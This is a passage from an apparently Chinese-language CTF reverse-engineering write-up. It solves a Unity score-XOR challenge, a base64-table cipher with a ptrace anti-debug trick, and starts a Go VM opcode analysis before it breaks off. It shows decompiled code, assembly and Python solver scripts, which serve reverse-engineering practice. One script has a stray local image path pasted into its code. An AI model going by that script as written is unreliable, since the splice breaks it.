class="built_in">int</span>[] magicc = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">75</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">102</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">108</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">43</span>,</span><br><span class="line">        <span class="number">47</span>,</span><br><span class="line">        <span class="number">63</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">118</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        <span class="number">108</span>,</span><br><span class="line">        <span class="number">62</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000009 RID: 9</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span>[] magic = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">90</span>,</span><br><span class="line">        <span class="number">81</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">92</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">90</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">73</span>,</span><br><span class="line">        <span class="number">75</span>,</span><br><span class="line">        <span class="number">64</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">88</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">92</span>,</span><br><span class="line">        <span class="number">91</span>,</span><br><span class="line">        <span class="number">9</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000A RID: 10</span></span><br><span class="line">    <span class="keyword">public</span> Text scoreText;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000B RID: 11</span></span><br><span class="line">    <span class="keyword">public</span> Text flagText;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000C RID: 12</span></span><br><span class="line">    <span class="keyword">public</span> GameObject pinPrefab;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x0400000D RID: 13</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> speed = <span class="number">3f</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到游戏前30次每刷新一次分数就会与明文进行异或 最后进行md5加密然后在分数达到100时显示 显然不可能点到100 <del>但是可以先点到30 再用CE改到100</del> 写出解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">key = [ 75, 109, 102, 63, 107, 112, 63, 108, 124, 112, 109, 122, 63, 43, 47, 63, 111, 112, 118, 113, 107, 108, 62]</span><br><span class="line">convt = hashlib.md5()</span><br><span class="line">for i in range(1, 31):</span><br><span class="line">    for j in range(len(key)):</span><br><span class="line">        key[j] ^= i</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for each in key:</span><br><span class="line">    flag += chr(each)</span><br><span class="line">convt.update(flag.encode())</span><br><span class="line">print(convt.hexdigest().upper())</span><br><span class="line"># CBDDD133B60130856D3C695D9E5ED6A5</span><br></pre></td></tr></table></figure>

<h3 id="babycode-不知道什么加密"><a href="#babycode-不知道什么加密" class="headerlink" title="babycode | 不知道什么加密"></a>babycode | 不知道什么加密</h3><p>IDA64打开 伪代码如下 其中两个简单加密算法不展示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-134h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="type">char</span> enc[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">33</span>]; <span class="comment">// [rsp+24h] [rbp-11Ch]</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">113</span>]; <span class="comment">// [rsp+B7h] [rbp-89h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;input[<span class="number">9</span>]);</span><br><span class="line">  *enc = <span class="number">120</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">91</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">86</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">122</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">93</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">84</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">37</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">49</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">32</span>;</span><br><span class="line">  v10[<span class="number">8</span>] = <span class="number">104</span>;</span><br><span class="line">  v10[<span class="number">9</span>] = <span class="number">61</span>;</span><br><span class="line">  v10[<span class="number">10</span>] = <span class="number">100</span>;</span><br><span class="line">  v10[<span class="number">11</span>] = <span class="number">-110</span>;</span><br><span class="line">  v10[<span class="number">12</span>] = <span class="number">118</span>;</span><br><span class="line">  v10[<span class="number">13</span>] = <span class="number">99</span>;</span><br><span class="line">  v10[<span class="number">14</span>] = <span class="number">123</span>;</span><br><span class="line">  v10[<span class="number">15</span>] = <span class="number">89</span>;</span><br><span class="line">  v10[<span class="number">16</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">17</span>] = <span class="number">33</span>;</span><br><span class="line">  v10[<span class="number">18</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">19</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">20</span>] = <span class="number">118</span>;</span><br><span class="line">  v10[<span class="number">21</span>] = <span class="number">-121</span>;</span><br><span class="line">  v10[<span class="number">22</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">23</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">24</span>] = <span class="number">-123</span>;</span><br><span class="line">  v10[<span class="number">25</span>] = <span class="number">112</span>;</span><br><span class="line">  v10[<span class="number">26</span>] = <span class="number">-98</span>;</span><br><span class="line">  v10[<span class="number">27</span>] = <span class="number">79</span>;</span><br><span class="line">  v10[<span class="number">28</span>] = <span class="number">112</span>;</span><br><span class="line">  v10[<span class="number">29</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">30</span>] = <span class="number">-124</span>;</span><br><span class="line">  v10[<span class="number">31</span>] = <span class="number">87</span>;</span><br><span class="line">  v10[<span class="number">32</span>] = <span class="number">-120</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(input, <span class="string">&quot;fuwafuwa&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;input[<span class="number">9</span>]); ++i )</span><br><span class="line">    input[i + <span class="number">9</span>] = (<span class="number">16</span> * input[i + <span class="number">9</span>]) | (input[i + <span class="number">9</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;<span class="comment">// 互换输入中的高/低四位</span></span><br><span class="line">  encode(&amp;input[<span class="number">9</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(&amp;input[<span class="number">9</span>]); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    input[j + <span class="number">9</span>] += j;</span><br><span class="line">    input[j + <span class="number">9</span>] ^= input[j % <span class="number">8</span>] % <span class="number">32</span> + <span class="number">1</span>;</span><br><span class="line">    ceasar(input, j);                           <span class="comment">// 向后移j位的凯撒加密</span></span><br><span class="line">    v3 = <span class="built_in">strlen</span>(input);</span><br><span class="line">    reverse(input, v3);                         <span class="comment">// 对称对换key(0-&gt;8, 1-&gt;7...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="built_in">strlen</span>(enc); ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[k + <span class="number">9</span>] != *&amp;enc[<span class="number">4</span> * k] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your input is flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+17h] [rbp-49h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> *ptr_input; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> *key2; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *ptr_input_; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="type">size_t</span> len_of_input; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 max_key; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 last; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  len_of_input = <span class="built_in">strlen</span>(input);</span><br><span class="line">  max_key = <span class="number">3</span> * ((len_of_input &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="built_in">malloc</span>(max_key + len_of_input);</span><br><span class="line">  key2 = &amp;v11[max_key];                         <span class="comment">// 输入的首地址</span></span><br><span class="line">  last = &amp;v11[max_key - <span class="number">1</span> + len_of_input];      <span class="comment">// v11的最后一个元素</span></span><br><span class="line">  ptr_input = &amp;v11[max_key];</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v11[max_key], input, len_of_input);   <span class="comment">// 最后的一段元素和输入相同</span></span><br><span class="line">  <span class="keyword">while</span> ( ptr_input &lt;= last )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr_input )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( ptr_input_ = ptr_input; ptr_input_ &lt;= last; ++ptr_input_ )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v2 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        v2 = *ptr_input_ &amp; <span class="number">0x3F</span>;</span><br><span class="line">        *ptr_input_ = (*ptr_input_ + v4) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *--key2 = off_55B72E249018[v2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++ptr_input;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    key += rand() % <span class="number">100</span>;</span><br><span class="line">  key = key % <span class="number">0x20</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; &amp;v11[max_key] - key2; ++j )</span><br><span class="line">    input[j] = key ^ key2[j];</span><br><span class="line">  input[j] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心加密是一个base64的换表 要注意的是其中的key动态调试出来并不正确 因为程序会检测动态调试改变key的初值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init_array:000055B72E248D80                               _init_array segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:000055B72E248D80                               assume cs:_init_array</span><br><span class="line">.init_array:000055B72E248D80                               ;org 55B72E248D80h</span><br><span class="line">.init_array:000055B72E248D80 00 62 24 2E B7 55 00 00       dq offset sub_55B72E246200</span><br><span class="line">.init_array:000055B72E248D88 09 62 24 2E B7 55 00 00       dq offset sub_55B72E246209</span><br><span class="line">.init_array:000055B72E248D88                               _init_array ends</span><br><span class="line">...</span><br><span class="line">.text:000055B72E246209                               sub_55B72E246209 proc near              ; DATA XREF: .init_array:000055B72E248D88↓o</span><br><span class="line">.text:000055B72E246209</span><br><span class="line">.text:000055B72E246209                               var_4= dword ptr -4</span><br><span class="line">.text:000055B72E246209</span><br><span class="line">.text:000055B72E246209                               ; __unwind &#123;</span><br><span class="line">.text:000055B72E246209 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000055B72E24620D 55                            push    rbp</span><br><span class="line">.text:000055B72E24620E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000055B72E246211 C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:000055B72E246218 BB 00 00 00 00                mov     ebx, 0                          ; ptrace_request</span><br><span class="line">.text:000055B72E24621D B9 00 00 00 00                mov     ecx, 0                          ; pid</span><br><span class="line">.text:000055B72E246222 BA 00 00 00 00                mov     edx, 0                          ; addr</span><br><span class="line">.text:000055B72E246227 B8 1A 00 00 00                mov     eax, 1Ah</span><br><span class="line">.text:000055B72E24622C CD 80                         int     80h                             ; LINUX - sys_ptrace</span><br><span class="line">.text:000055B72E24622C</span><br><span class="line">.text:000055B72E24622E 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:000055B72E246231 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:000055B72E246234 48 98                         cdqe</span><br><span class="line">.text:000055B72E246236 48 83 F8 FF                   cmp     rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:000055B72E24623A 75 0A                         jnz     short loc_55B72E246246</span><br><span class="line">.text:000055B72E24623A</span><br><span class="line">.text:000055B72E24623C C7 05 CA 2D 00 00 08 00 00 00 mov     cs:key, 8</span><br><span class="line">.text:000055B72E24623C</span><br><span class="line">.text:000055B72E246246</span><br><span class="line">.text:000055B72E246246                               loc_55B72E246246:                       ; CODE XREF: sub_55B72E246209+31↑j</span><br><span class="line">.text:000055B72E246246 90                            nop</span><br><span class="line">.text:000055B72E246247 5D                            pop     rbp</span><br><span class="line">.text:000055B72E246248 C3                            retn</span><br><span class="line">.text:000055B72E246248                               ; &#125; // starts at 55B72E246209</span><br><span class="line">.text:000055B72E246248</span><br><span class="line">.text:000055B72E246248                               sub_55B72E246209 endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以用key在<code>(1, 31)</code>且加密后密文都在表中爆破出key为21 据此写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">![image-<span class="number">20231128164528686</span>](C:\Users\Orink\AppData\Roaming\Typora\typora-user-images\image-<span class="number">20231128164528686.</span>png)<span class="keyword">def</span> <span class="title function_">emulator</span>(<span class="params">key:<span class="built_in">list</span>, time:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        key[i] = <span class="number">97</span> + (key[i] - <span class="number">97</span> + time) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">antiemulator</span>(<span class="params">key:<span class="built_in">list</span>, time:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        key[i] = <span class="number">97</span> + (key[i] - <span class="number">97</span> - time) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">table = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> <span class="string">&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span>]</span><br><span class="line">enc = [val &amp; <span class="number">0xFF</span> <span class="keyword">for</span> val <span class="keyword">in</span> [<span class="number">120</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">122</span>, <span class="number">93</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">61</span>, <span class="number">100</span>, -<span class="number">110</span>, <span class="number">118</span>, <span class="number">99</span>, <span class="number">123</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">33</span>, -<span class="number">124</span>, <span class="number">87</span>, <span class="number">118</span>, -<span class="number">121</span>, <span class="number">114</span>, -<span class="number">124</span>, -<span class="number">123</span>, <span class="number">112</span>, -<span class="number">98</span>, <span class="number">79</span>, <span class="number">112</span>, <span class="number">114</span>, -<span class="number">124</span>, <span class="number">87</span>, -<span class="number">120</span>]]</span><br><span class="line">key_0 = <span class="string">&#x27;fuwafuwa&#x27;</span></span><br><span class="line">key = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> key_0]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    emulator(key, i)</span><br><span class="line">    key = key[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    key = key[::-<span class="number">1</span>]</span><br><span class="line">    antiemulator(key, i)</span><br><span class="line">    enc[i] ^= key[i % <span class="number">8</span>] % <span class="number">32</span> + <span class="number">1</span></span><br><span class="line">    enc[i] -= i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    enc[i] ^= <span class="number">21</span></span><br><span class="line">enc = [table.index(val) <span class="keyword">for</span> val <span class="keyword">in</span> enc]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> enc:</span><br><span class="line">    flag += <span class="string">&quot;&#123;:06b&#125;&quot;</span>.<span class="built_in">format</span>(each)</span><br><span class="line">flag = flag[<span class="number">4</span>:]</span><br><span class="line">flag = [flag[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> ra![image-<span class="number">20231128164528686</span>](C:\Users\Orink\AppData\Roaming\Typora\typora-user-images\image-<span class="number">20231128164528686.</span>png)nge(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SYC&#123;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(each[<span class="number">4</span>:<span class="number">8</span>] + each[<span class="number">0</span>:<span class="number">4</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;HbwKqCOAOVXdHAbG0HeinZkez&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="yakvm-虚拟机逆向"><a href="#yakvm-虚拟机逆向" class="headerlink" title="yakvm | 虚拟机逆向"></a>yakvm | 虚拟机逆向</h3><p>main为生成的虚拟机 IDA打开发现是无符号go 用go paraser恢复符号 搜索有关操作码的函数</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-13.png" alt="image-20231128164544215" style="zoom:67%;" />

<p>发现有一个ShowOpcodes函数 但 调试时不进过该函数 交叉引用找到调用它的函数</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-14.png" alt="image-20231128164844486" style="zoom:67%;" />

<p>在判断处下断点 调试时通过改ZF寄存器步进ShowOpcodes函数 得到可读操作码 根据官方文档分析如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2:6-&gt;2:9         0:OP:type                 byte</span><br><span class="line">2:4-&gt;2:119       1:OP:type                 slice</span><br><span class="line">2:11-&gt;2:13       2:OP:push                 137</span><br><span class="line">2:15-&gt;2:17       3:OP:push                 108</span><br><span class="line">2:19-&gt;2:21       4:OP:push                 159</span><br><span class="line">2:23-&gt;2:25       5:OP:push                 114</span><br><span class="line">2:27-&gt;2:29       6:OP:push                 185</span><br><span class="line">2:31-&gt;2:32       7:OP:push                 90</span><br><span class="line">2:34-&gt;2:36       8:OP:push                 174</span><br><span class="line">2:38-&gt;2:39       9:OP:push                 68</span><br><span class="line">2:41-&gt;2:43      10:OP:push                 160</span><br><span class="line">2:45-&gt;2:46      11:OP:push                 81</span><br><span class="line">2:48-&gt;2:50      12:OP:push                 179</span><br><span class="line">2:52-&gt;2:53      13:OP:push                 41</span><br><span class="line">2:55-&gt;2:57      14:OP:push                 186</span><br><span class="line">2:59-&gt;2:60      15:OP:push                 89</span><br><span class="line">2:62-&gt;2:64      16:OP:push                 168</span><br><span class="line">2:66-&gt;2:67      17:OP:push                 78</span><br><span class="line">2:69-&gt;2:71      18:OP:push                 229</span><br><span class="line">2:73-&gt;2:75      19:OP:push                 121</span><br><span class="line">2:77-&gt;2:79      20:OP:push                 149</span><br><span class="line">2:81-&gt;2:83      21:OP:push                 106</span><br><span class="line">2:85-&gt;2:87      22:OP:push                 147</span><br><span class="line">2:89-&gt;2:91      23:OP:push                 103</span><br><span class="line">2:93-&gt;2:95      24:OP:push                 156</span><br><span class="line">2:97-&gt;2:99      25:OP:push                 114</span><br><span class="line">2:101-&gt;2:103    26:OP:push                 133</span><br><span class="line">2:105-&gt;2:106    27:OP:push                 98</span><br><span class="line">2:108-&gt;2:110    28:OP:push                 146</span><br><span class="line">2:112-&gt;2:114    29:OP:push                 116</span><br><span class="line">2:116-&gt;2:118    30:OP:push                 181</span><br><span class="line">2:4-&gt;2:119      31:OP:typedslice           29</span><br><span class="line">2:4-&gt;2:119      32:OP:list                 1</span><br><span class="line">2:0-&gt;2:0        33:OP:pushleftr            1            arg_1 = key_list[29]</span><br><span class="line">2:0-&gt;2:0        34:OP:list                 1</span><br><span class="line">2:0-&gt;2:119      35:OP:assign               </span><br><span class="line">3:0-&gt;3:4        36:OP:pushid               print</span><br><span class="line">3:6-&gt;3:25       37:OP:push                 please input flag:</span><br><span class="line">3:5-&gt;3:26       38:OP:call                 vlen:1</span><br><span class="line">3:0-&gt;3:26       39:OP:pop                  </span><br><span class="line">4:4-&gt;4:6        40:OP:pushid               get</span><br><span class="line">4:7-&gt;4:8        41:OP:call                 vlen:0</span><br><span class="line">4:4-&gt;4:8        42:OP:list                 1</span><br><span class="line">4:0-&gt;4:0        43:OP:pushleftr            2</span><br><span class="line">4:0-&gt;4:0        44:OP:list                 1            arg_2 = input[29]</span><br><span class="line">4:0-&gt;4:8        45:OP:assign               </span><br><span class="line">5:18-&gt;8:0       46:OP:new-scope            2            &#123;</span><br><span class="line">5:3-&gt;5:5        47:OP:pushid               len</span><br><span class="line">5:7-&gt;5:7        48:OP:pushr                2</span><br><span class="line">5:6-&gt;5:8        49:OP:call                 vlen:1            len(arg_2)</span><br><span class="line">5:12-&gt;5:14      50:OP:pushid               len</span><br><span class="line">5:16-&gt;5:16      51:OP:pushr                1                len(arg_1)</span><br><span class="line">5:15-&gt;5:17      52:OP:call                 vlen:1</span><br><span class="line">5:3-&gt;5:17       53:OP:gt                                       len(arg_1) &gt; len(arg_2) -&gt; goto globle63</span><br><span class="line">5:18-&gt;8:0       54:OP:jmpf                 -&gt; 63</span><br><span class="line">5:18-&gt;8:0       55:OP:new-scope            3                &#123;</span><br><span class="line">6:1-&gt;6:7        56:OP:pushid               println</span><br><span class="line">6:9-&gt;6:32       57:OP:push                 input string too long!    printf(too long!)</span><br><span class="line">6:8-&gt;6:33       58:OP:call                 vlen:1</span><br><span class="line">6:1-&gt;6:33       59:OP:pop                  </span><br><span class="line">7:1-&gt;7:6        60:OP:return               </span><br><span class="line">5:18-&gt;8:0       61:OP:end-scope                                &#125;</span><br><span class="line">5:18-&gt;8:0       62:OP:jmp                  -&gt; 63            globle63:</span><br><span class="line">5:18-&gt;8:0       63:OP:end-scope                            &#125;</span><br><span class="line">12:8-&gt;21:0      64:OP:push                 function params[1] codes[54] (copy)</span><br><span class="line">12:8-&gt;21:0      65:OP:list                 1</span><br><span class="line">12:0-&gt;12:4      66:OP:pushleftr            8            arg_8 = func1</span><br><span class="line">12:0-&gt;12:4      67:OP:list                 1</span><br><span class="line">12:0-&gt;21:0      68:OP:assign               </span><br><span class="line">25:4-&gt;25:8      69:OP:pushr                8</span><br><span class="line">25:10-&gt;25:10    70:OP:pushr                2</span><br><span class="line">25:9-&gt;25:11     71:OP:call                 vlen:1        arg2 = func1(arg_2)</span><br><span class="line">25:4-&gt;25:11     72:OP:list                 1</span><br><span class="line">25:0-&gt;25:0      73:OP:pushleftr            2</span><br><span class="line">25:0-&gt;25:0      74:OP:list                 1</span><br><span class="line">25:0-&gt;25:11     75:OP:assign               </span><br><span class="line">28:9-&gt;33:0      76:OP:push                 function params[0] codes[40] (copy)</span><br><span class="line">28:9-&gt;33:0      77:OP:list                 1</span><br><span class="line">28:0-&gt;28:4      78:OP:pushleftr            14</span><br><span class="line">28:0-&gt;28:4      79:OP:list                 1</span><br><span class="line">28:0-&gt;33:0      80:OP:assign               </span><br><span class="line">36:0-&gt;36:4      81:OP:pushr                14</span><br><span class="line">36:5-&gt;36:6      82:OP:call                 vlen:0       func2()</span><br><span class="line">36:0-&gt;36:6      83:OP:pop                  </span><br><span class="line">38:11-&gt;48:0     84:OP:push                 function params[0] codes[52] (copy)</span><br><span class="line">38:11-&gt;48:0     85:OP:list                 1</span><br><span class="line">38:0-&gt;38:7      86:OP:pushleftr            19</span><br><span class="line">38:0-&gt;38:7      87:OP:list                 1</span><br><span class="line">38:0-&gt;48:0      88:OP:assign               </span><br><span class="line">51:14-&gt;53:0     89:OP:new-scope            24</span><br><span class="line">51:3-&gt;51:10     90:OP:pushr                19</span><br><span class="line">51:11-&gt;51:12    91:OP:call                 vlen:0</span><br><span class="line">51:14-&gt;53:0     92:OP:jmpf                 -&gt; 100</span><br><span class="line">51:14-&gt;53:0     93:OP:new-scope            25</span><br><span class="line">52:1-&gt;52:5      94:OP:pushid               print</span><br><span class="line">52:7-&gt;52:24     95:OP:push                 yes! you get it!</span><br><span class="line">52:6-&gt;52:25     96:OP:call                 vlen:1</span><br><span class="line">52:1-&gt;52:25     97:OP:pop                  </span><br><span class="line">51:14-&gt;53:0     98:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0     99:OP:jmp                  -&gt; 108</span><br><span class="line">51:14-&gt;53:0    100:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0    101:OP:new-scope            26</span><br><span class="line">53:6-&gt;55:0     102:OP:new-scope            27</span><br><span class="line">54:1-&gt;54:5     103:OP:pushid               print</span><br><span 